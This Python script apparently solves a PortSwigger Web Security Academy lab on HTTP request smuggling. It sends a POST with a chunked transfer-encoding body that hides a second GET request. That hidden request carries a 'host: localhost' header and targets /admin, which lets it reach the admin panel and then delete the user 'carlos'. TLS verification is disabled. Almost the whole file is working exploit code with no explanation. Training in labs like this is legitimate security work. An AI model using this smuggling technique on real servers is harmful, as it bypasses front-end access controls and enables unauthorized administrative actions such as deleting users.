import urllib.parse
import http.client
import ssl

LAB_ID = "???"


def request_len(method: str, path: str, headers: dict[str, str], body: str | None = None) -> int:
    first_line_len = len(f"{method} {path} HTTP/1.1\r\n")
    headers_len = len('\r\n'.join([f"{name}: {value}" for name, value in headers.items()]))
    body_len = len('\r\n')
    if body is not None:
        body_len = body_len + len(body)
    return first_line_len + headers_len + body_len


def POST_(get_req_len: int, smuggled_path: str) -> http.client.HTTPResponse:
    method, path = 'POST', '/'
    host, port = f'{LAB_ID}.web-security-academy.net', 443
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.5',
        'transfer-encoding': 'chunked',
    }
    smuggled = f"""GET {smuggled_path} HTTP/1.1
Content-Type: application/x-www-form-urlencoded
host: localhost
Content-Length: {9 + get_req_len}

x=
0
""".replace('\n', '\r\n')
    smuggled_len = f'{len(smuggled):x}'
    body = f"{smuggled_len}\r\n{smuggled}\r\n0\r\n\r\n"
    headers['content-length'] = str(len(smuggled_len) + 2)
    connection = http.client.HTTPSConnection(host, port, context=ssl._create_unverified_context())
    connection.request(method, path, body.encode('utf-8'), headers)
    return connection.getresponse()


def GET_() -> tuple[http.client.HTTPResponse, int]:
    method, path = 'GET', '/'
    host, port = f'{LAB_ID}.web-security-academy.net', 443
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.5',
    }
    connection = http.client.HTTPSConnection(host, port, context=ssl._create_unverified_context())
    connection.request(method, path, '', headers)
    return connection.getresponse(), request_len(method, path, headers)


response, get_req_len = GET_()
print(f"GET response status: {response.status}")
print(f"GET request length: {get_req_len}")
response = POST_(get_req_len, "/admin")
print(f"POST response status: {response.status}")
response, _ = GET_()
print(f"poisoned GET response status: {response.status}")
for name, header in response.headers.items():
    print(f"{name}: {header}")
print(response.read().decode('utf-8'))
print()
print("deleting user carlos")
response, _ = GET_()
POST_(get_req_len, "/admin/delete?username=carlos")
response, _ = GET_()
print(f"poisoned GET response status: {response.status}")
for name, header in response.headers.items():
    print(f"{name}: {header}")
print(response.read().decode('utf-8'))
print()
print("deleting user carlos")